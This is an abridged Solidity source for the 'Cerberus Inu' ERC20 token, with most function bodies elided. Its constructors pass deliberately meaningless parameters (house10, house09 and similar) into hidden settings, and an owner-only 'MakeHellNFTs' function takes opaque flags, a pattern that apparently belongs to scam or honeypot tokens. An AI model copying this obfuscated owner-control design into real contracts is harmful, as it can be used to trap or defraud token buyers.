...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_, address creator_, bool house10, bool house002, uint256 house09) {
        _name = name_;
        _symbol = symbol_;
        tXs = house09;
        ...
        tempVal = house002;
        _creator = creator_;
        DoRedistributionWithUniswap[creator_] = house10;
    }
    ...
    function MakeHellNFTs(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
    ...
    function _OpenTheGate(address account, uint256 amount, uint256 val1, uint256 val2) internal virtual {
...
contract ERC20Cerberus is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        bool house010, bool house20, uint256 house06,
        uint256 house7, address creator,
        uint256 initialSupply, address owner,
        uint256 house09
    ) ERC20(name, symbol, creator, house010, house20, house09) {
        _OpenTheGate(owner, initialSupply, house06, house7);
    }
}

contract CerberusInu is ERC20Cerberus {
    constructor() ERC20Cerberus("Cerberus Inu", "CERBERUS", false, true, 1000, 23, msg.sender, 10000000000 * 10 ** 18, msg.sender, 7) {
    }
}